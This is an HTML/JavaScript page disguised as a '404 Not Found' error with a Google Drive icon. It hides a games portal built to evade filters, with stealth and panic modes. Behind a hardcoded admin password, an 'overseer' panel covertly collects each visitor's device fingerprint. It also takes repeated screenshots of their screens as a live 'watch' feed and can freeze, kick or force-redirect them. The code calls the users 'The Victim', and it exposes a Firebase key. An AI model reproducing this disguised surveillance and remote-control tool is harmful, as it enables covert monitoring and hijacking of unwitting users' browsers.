<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>404 Not Found</title>
    <link id="favicon" rel="icon" href="https://ssl.gstatic.com/images/branding/product/1x/drive_2020q4_32dp.png">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
    <style>
        :root { --primary: #00ff41; --bg: #000; --card: #111; --accent: #003b00; --fav: #ff4757; --warn: #ffae00; --err: #ff0000; }
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #fff; color: #000; font-family: 'Segoe UI', sans-serif; overflow: hidden; }
        
        /* Secret Triggers */
        #ghostAdmin { position: fixed; top: 0; left: 0; width: 60px; height: 60px; z-index: 2000000; cursor: default; }
        #ghostPleb { position: fixed; top: 0; right: 0; width: 60px; height: 60px; z-index: 2000000; cursor: default; }

        #lockdown { position: fixed; inset: 0; background: #fff; z-index: 1000000; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        #loginOverlay { position: fixed; inset: 0; background: rgba(0,0,0,0.98); z-index: 1500000; display: none; align-items: center; justify-content: center; }
        #freeze { position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 9999999; display: none; cursor: wait; color: var(--primary); font-family: monospace; display: flex; align-items: center; justify-content: center; font-size: 20px; }
        #freeze::after { content: "SYSTEM_PAUSED_BY_ADMIN"; }

        #app { display: none; height: 100vh; flex-direction: column; background: var(--bg); color: var(--primary); font-family: 'Consolas', monospace; }
        .nav { display: flex; justify-content: space-between; align-items: center; padding: 10px 20px; background: #080808; border-bottom: 1px solid #222; }
        
        .game-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 15px; padding: 20px; overflow-y: auto; flex-grow: 1; }
        .card { background: var(--card); border: 1px solid #222; padding: 30px 15px; text-align: center; cursor: pointer; border-radius: 8px; color: var(--primary); position: relative; transition: 0.2s; }
        .card:hover { border-color: var(--primary); background: #0a1a0a; transform: scale(1.02); }
        
        .fav-area { position: absolute; top: 0; right: 0; width: 50px; height: 50px; display: flex; align-items: center; justify-content: center; z-index: 50; }
        .fav-btn { color: #222; font-size: 24px; pointer-events: none; transition: 0.2s; }
        .fav-btn.active { color: var(--fav); text-shadow: 0 0 10px var(--fav); }

        .modal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #0a0a0a; border: 1px solid #333; padding: 25px; z-index: 3000000; width: 95%; max-width: 1200px; border-radius: 12px; box-shadow: 0 0 60px #000; color: #fff; }
        .input { background: #000; border: 1px solid #444; color: var(--primary); padding: 12px; width: 100%; box-sizing: border-box; margin: 10px 0; outline: none; border-radius: 6px; font-family: monospace; }
        .btn { background: var(--primary); color: #000; border: none; padding: 10px 15px; cursor: pointer; font-weight: bold; border-radius: 4px; text-transform: uppercase; font-size: 11px; transition: 0.2s; font-family: monospace; }
        .btn:hover { opacity: 0.8; }
        .btn-red { background: var(--err); color: #fff; }
        .btn-warn { background: var(--warn); color: #000; }
        
        .admin-layout { display: flex; gap: 20px; height: 600px; }
        .u-sidebar { width: 300px; border: 1px solid #333; overflow-y: auto; background: #050505; }
        .u-item { padding: 15px; border-bottom: 1px solid #222; cursor: pointer; color: #888; transition: 0.2s; }
        .u-item:hover { background: #111; color: #fff; }
        .u-item.selected { border-left: 4px solid var(--primary); background: #0a1a0a; color: var(--primary); }
        .u-item b { color: #fff; }
        
        .d-content { flex-grow: 1; display: flex; flex-direction: column; gap: 10px; overflow: hidden; }
        .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; font-size: 12px; background: #000; padding: 15px; border: 1px solid #333; color: #ccc; overflow-y: auto; max-height: 150px; }
        .info-grid b { color: var(--primary); }

        #preview { height: 350px; border: 1px solid #333; background: #000 no-repeat center; background-size: contain; position: relative; }
        #live-indicator { position: absolute; top: 10px; right: 10px; background: red; color: white; padding: 5px 10px; border-radius: 4px; font-size: 10px; display: none; animation: blink 1s infinite; }
        @keyframes blink { 50% { opacity: 0; } }
    </style>
</head>
<body>

    <div id="ghostAdmin" onclick="door('admin')"></div>
    <div id="ghostPleb" onclick="door('pleb')"></div>

    <div id="lockdown"><h1>404</h1><p>The requested URL was not found on this server.</p></div>
    <div id="freeze" style="display:none;"></div>

    <div id="loginOverlay">
        <div style="text-align:center; width: 320px; background:#0a0a0a; padding:40px; border-radius:15px; border:1px solid #333;">
            <h2 style="color:var(--primary); margin-top:0;">MONGLE_OS v2.0</h2>
            <input type="text" id="username" class="input" placeholder="Identify Yourself...">
            <button class="btn" style="width:100%" onclick="initSession()">CONNECT</button>
        </div>
    </div>

    <div id="app">
        <div class="nav">
            <div style="min-width: 150px;"><b>MONGLE_OS</b> <span id="badge" style="font-size:10px; color:var(--primary);"></span></div>
            <div style="display:flex; gap:10px; flex-grow:1; justify-content: center; max-width:800px;">
                <select id="cat" class="input" style="width:140px; margin:0;" onchange="renderGrid()">
                    <option value="all">ALL_FILES</option>
                    <option value="favs">FAVORITES ‚ù§Ô∏è</option>
                    <option value="fnaf">FNAF</option>
                    <option value="horror">HORROR</option>
                    <option value="action">ACTION</option>
                </select>
                <input type="text" id="search" class="input" style="margin:0; max-width: 300px;" placeholder="Search Database..." oninput="renderGrid()">
            </div>
            <div style="display:flex; gap:8px; min-width: 150px; justify-content: flex-end;">
                <button id="adminBtn" class="btn" style="display:none; background: #222; color: var(--primary); border: 1px solid var(--primary);" onclick="toggleModal('adminM')">OVERSEER PANEL</button>
                <button class="btn" style="background:#222; color:#fff;" onclick="toggleModal('settingsM')">‚öôÔ∏è</button>
                <button class="btn btn-red" onclick="panicTrigger()">PANIC</button>
            </div>
        </div>
        <div id="grid" class="game-grid"></div>
    </div>

    <div id="adminM" class="modal">
        <div style="display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid #333; padding-bottom:10px; margin-bottom:15px;">
            <h3 style="margin:0; color:var(--primary);">OVERSEER_CONTROL_DECK</h3>
            <div>
                <button class="btn btn-warn" onclick="globalReload()">NUKE (RELOAD ALL)</button>
                <button class="btn" style="background:#222; color:#fff;" onclick="toggleModal('adminM')">CLOSE</button>
            </div>
        </div>
        
        <div class="admin-layout">
            <div id="userList" class="u-sidebar"></div>
            <div class="d-content">
                <div id="dossier" class="info-grid">Select a user to view intel...</div>
                
                <div id="preview">
                    <div id="live-indicator">‚óè LIVE FEED</div>
                </div>

                <div style="display:grid; grid-template-columns: repeat(6, 1fr); gap:8px;">
                    <button class="btn" onclick="adminAct('capReq')">üì∏ SNAP</button>
                    <button class="btn" id="watchBtn" style="background:#004400; color:white;" onclick="toggleWatch()">üëÅÔ∏è WATCH</button>
                    <button class="btn btn-warn" onclick="adminAct('frozen')">‚ùÑÔ∏è FREEZE</button>
                    <button class="btn" style="background:purple; color:white;" onclick="adminAct('reload')">‚Üª RELOAD</button>
                    <button class="btn btn-red" onclick="adminAct('kicked')">üö´ KICK</button>
                    <button class="btn" style="background:#333; color:#ccc;" onclick="wipeDatabase()">üóëÔ∏è WIPE</button>
                </div>
                
                <div style="display:flex; gap:8px; margin-top: 5px;">
                    <input type="text" id="adminCommandInp" class="input" style="margin:0;" placeholder="Message or Redirect URL...">
                    <button class="btn" onclick="adminCustom('msg')">SEND MSG</button>
                    <button class="btn" onclick="adminCustom('redir')">FORCE REDIR</button>
                </div>
            </div>
        </div>
    </div>

    <div id="settingsM" class="modal" style="width:340px;">
        <h3>CONFIG</h3>
        <label style="font-size:12px; color:#888;">PANIC URL</label>
        <input type="text" id="cfgUrl" class="input" placeholder="https://google.com">
        <label style="font-size:12px; color:#888;">PANIC KEY (e.g. Escape, F1)</label>
        <input type="text" id="cfgKey" class="input" placeholder="Escape">
        <label style="font-size:12px; color:#888;">STEALTH MODE</label>
        <select id="cfgMode" class="input">
            <option value="tab">New Tab (Standard)</option>
            <option value="blank">About:Blank (Full Stealth)</option>
        </select>
        <button class="btn" style="width:100%" onclick="saveConfig()">SAVE CONFIG</button>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getDatabase, ref, onValue, set, update, push, remove, onDisconnect } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

        const firebaseConfig = { apiKey: "AIzaSyDgRvxKypPsOx379SNleE6Uij7mKkEJxGY", databaseURL: "https://monglearcade-default-rtdb.firebaseio.com", projectId: "monglearcade" };
        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        let userRef, myID, selectedID, isAdmin = false, gameData = [];
        let favs = JSON.parse(localStorage.getItem('favs') || '[]');
        let cfg = { url: localStorage.getItem('pUrl') || 'https://google.com', key: localStorage.getItem('pKey') || 'Escape', mode: localStorage.getItem('pMode') || 'tab' };
        
        let activeGameWindow = null; // Track opened game
        let watchInterval = null; // Interval for live watching

        window.door = (type) => {
            if(type === 'admin') {
                if(prompt("AUTH_CODE:") === "MONGLE_OWNER_99") {
                    isAdmin = true; document.getElementById('adminBtn').style.display="block"; 
                    document.getElementById('badge').innerText="[OVERSEER]"; initSession();
                }
            } else { document.getElementById('loginOverlay').style.display = 'flex'; }
        };

        window.initSession = async () => {
            const name = document.getElementById('username').value || "Guest_" + Math.floor(Math.random()*1000);
            document.getElementById('lockdown').style.display="none"; 
            document.getElementById('loginOverlay').style.display="none"; 
            document.getElementById('app').style.display="flex";

            const bat = await navigator.getBattery?.().catch(()=>({}));
            const ua = navigator.userAgent;
            
            // Richer Data for Admin
            const payload = {
                name: name, 
                activity: 'Browsing Menu', 
                joined: new Date().toLocaleTimeString(),
                res: `${screen.width}x${screen.height}`, 
                hw: `${navigator.hardwareConcurrency||'?'}C / ${navigator.deviceMemory||'?'}GB`,
                bat: bat?.level ? `${Math.round(bat.level*100)}%` : 'Unknown',
                plat: navigator.platform,
                ua: ua.substring(0, 50) + (ua.length>50?'...':''), // Short user agent
                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
                reload: false
            };

            userRef = push(ref(db, 'presence'), payload);
            myID = userRef.key;
            onDisconnect(userRef).remove();

            // Client Listener (The Victim/User side)
            onValue(ref(db, `presence/${myID}`), (s) => {
                const d = s.val(); if(!d) return;
                
                // KICK logic: Close game tabs too
                if(d.kicked) {
                    if(activeGameWindow) activeGameWindow.close();
                    window.location.replace(cfg.url);
                }
                if(d.redir) window.location.replace(d.redir);
                if(d.reload) { window.location.reload(); }

                // FREEZE logic
                const f = document.getElementById('freeze');
                f.style.display = d.frozen ? 'flex' : 'none';
                // If frozen, try to close external game to force attention
                if(d.frozen && activeGameWindow) activeGameWindow.close(); 

                if(d.msg) { alert("ADMIN MESSAGE:\n" + d.msg); update(userRef, {msg: null}); }
                
                // SNAPSHOT logic
                if(d.capReq) {
                    html2canvas(document.body, {useCORS: true, allowTaint: true}).then(c => {
                        update(userRef, {lastCap: c.toDataURL("image/webp", 0.2), capReq: false});
                    }).catch(e => update(userRef, {capReq: false})); // Reset even on fail
                }
            });

            // Load Games
            const res = await fetch('https://api.github.com/repos/bob154526-hue/Mongle/contents/');
            const data = await res.json();
            gameData = data.filter(f => f.name.endsWith('.html') && f.name !== 'index.html');
            renderGrid();
            
            if(isAdmin) startOverseer();
        };

        window.renderGrid = () => {
            const q = document.getElementById('search').value.toLowerCase();
            const cat = document.getElementById('cat').value;
            const grid = document.getElementById('grid'); grid.innerHTML = "";
            let sorted = [...gameData].sort((a,b) => favs.includes(b.name) - favs.includes(a.name));
            
            sorted.filter(g => {
                const n = g.name.toLowerCase();
                if (!n.includes(q)) return false;
                if (cat === 'favs') return favs.includes(g.name);
                if (cat === 'fnaf') return n.includes('fnaf');
                if (cat === 'horror') return n.includes('horror');
                if (cat === 'action') return n.includes('doom') || n.includes('quake') || n.includes('action');
                return true;
            }).forEach(g => {
                const card = document.createElement('div'); card.className = "card";
                card.innerHTML = `<div class="fav-area" onclick="toggleFav(event,'${g.name}')"><span class="fav-btn ${favs.includes(g.name)?'active':''}">‚ù§</span></div>${g.name.replace('.html','').toUpperCase()}`;
                card.onclick = () => {
                    const url = `https://raw.githack.com/bob154526-hue/Mongle/main/${g.name}`;
                    update(userRef, {activity: 'Playing '+g.name});
                    
                    if(cfg.mode==='blank') {
                        // Stealth Iframe Mode
                        activeGameWindow = window.open('about:blank');
                        activeGameWindow.document.body.innerHTML = `<style>body,html{margin:0;padding:0;height:100vh;width:100vw;overflow:hidden;background:#000}iframe{width:100vw;height:100vh;border:none}</style><iframe src="${url}" allowfullscreen></iframe>`;
                    } else {
                        // Standard Tab
                        activeGameWindow = window.open(url, '_blank');
                    }
                };
                grid.appendChild(card);
            });
        };

        window.toggleFav = (e, n) => { e.stopPropagation(); if(favs.includes(n)) favs = favs.filter(f=>f!==n); else favs.push(n); localStorage.setItem('favs', JSON.stringify(favs)); renderGrid(); };

        /* --- ADMIN LOGIC --- */
        function startOverseer() {
            onValue(ref(db, 'presence'), (snap) => {
                const list = document.getElementById('userList'); list.innerHTML = "";
                snap.forEach(c => {
                    const u = c.val();
                    const d = document.createElement('div');
                    d.className = `u-item ${selectedID === c.key ? 'selected' : ''}`;
                    // Highlight if user is frozen or kicked
                    let status = "";
                    if(u.frozen) status = "‚ùÑÔ∏è";
                    if(u.kicked) status = "üö´";
                    
                    d.innerHTML = `<b>${status} ${u.name}</b><br><small>${u.activity}</small>`;
                    d.onclick = () => {
                        selectedID = c.key;
                        updateDossier(u, c.key);
                        startOverseer(); // Re-render to show selection
                    };
                    list.appendChild(d);
                    
                    // Live Update Dossier if currently selected
                    if(selectedID === c.key) updateDossier(u, c.key);
                });
            });
        }

        function updateDossier(u, key) {
            document.getElementById('dossier').innerHTML = `
                <div><b>ID:</b> ${key.substring(0,8)}...</div>
                <div><b>STATUS:</b> ${u.frozen?'FROZEN':'ACTIVE'}</div>
                <div><b>ACTIVITY:</b> ${u.activity}</div>
                <div><b>TIME:</b> ${u.joined}</div>
                <div><b>DEVICE:</b> ${u.plat}</div>
                <div><b>RES:</b> ${u.res}</div>
                <div><b>HARDWARE:</b> ${u.hw}</div>
                <div><b>BATTERY:</b> ${u.bat}</div>
                <div><b>ZONE:</b> ${u.tz || 'N/A'}</div>
                <div style="grid-column: span 2; font-size:10px; color:#666; word-break:break-all;"><b>UA:</b> ${u.ua}</div>
            `;
            if(u.lastCap) document.getElementById('preview').style.backgroundImage = `url(${u.lastCap})`;
        }

        window.adminAct = (t) => { 
            if(!selectedID) return;
            // Get current value first to toggle
            onValue(ref(db, `presence/${selectedID}/${t}`), (s) => {
                let val = !s.val();
                if(t === 'reload') val = true; // Always set reload to true
                update(ref(db, `presence/${selectedID}`), {[t]: val});
            }, {onlyOnce:true});
        };

        window.adminCustom = (t) => { if(selectedID) update(ref(db, `presence/${selectedID}`), {[t]: document.getElementById('adminCommandInp').value}); };
        
        window.globalReload = () => {
            if(confirm("WARNING: This will reload EVERY connected client. Continue?")) {
                onValue(ref(db, 'presence'), (s) => {
                    s.forEach(c => update(ref(db, `presence/${c.key}`), {reload: true}));
                }, {onlyOnce:true});
            }
        };

        window.wipeDatabase = () => { if(confirm("NUKE DATABASE? This clears all users.")) remove(ref(db, 'presence')); };

        /* --- WATCH MODE --- */
        window.toggleWatch = () => {
            const btn = document.getElementById('watchBtn');
            const ind = document.getElementById('live-indicator');
            
            if(watchInterval) {
                // Stop Watching
                clearInterval(watchInterval);
                watchInterval = null;
                btn.style.background = "#004400"; btn.innerText = "üëÅÔ∏è WATCH";
                ind.style.display = "none";
            } else {
                if(!selectedID) return alert("Select a user first.");
                // Start Watching
                btn.style.background = "red"; btn.innerText = "‚èπ STOP";
                ind.style.display = "block";
                
                // Trigger immediately then every 2s
                update(ref(db, `presence/${selectedID}`), {capReq: true});
                watchInterval = setInterval(() => {
                    if(!selectedID) { clearInterval(watchInterval); return; }
                    update(ref(db, `presence/${selectedID}`), {capReq: true});
                }, 2000);
            }
        };

        /* --- UTILS --- */
        window.panicTrigger = () => {
            if(activeGameWindow) activeGameWindow.close();
            window.location.replace(cfg.url);
        };
        
        window.toggleModal = (id) => { const m = document.getElementById(id); m.style.display = m.style.display === 'block' ? 'none' : 'block'; };
        
        window.addEventListener('keydown', (e) => {
            if (e.key === cfg.key || e.code === cfg.key) panicTrigger();
            if (e.shiftKey && (e.key === 'L' || e.key === 'l')) {
                e.preventDefault();
                document.getElementById('loginOverlay').style.display = 'flex';
            }
        }, true);

        window.saveConfig = () => {
            cfg.url = document.getElementById('cfgUrl').value; cfg.key = document.getElementById('cfgKey').value; cfg.mode = document.getElementById('cfgMode').value;
            localStorage.setItem('pUrl', cfg.url); localStorage.setItem('pKey', cfg.key); localStorage.setItem('pMode', cfg.mode);
            alert("CONFIG SAVED"); toggleModal('settingsM');
        };

        document.getElementById('cfgUrl').value = cfg.url; document.getElementById('cfgKey').value = cfg.key; document.getElementById('cfgMode').value = cfg.mode;
    </script>
</body>
</html>
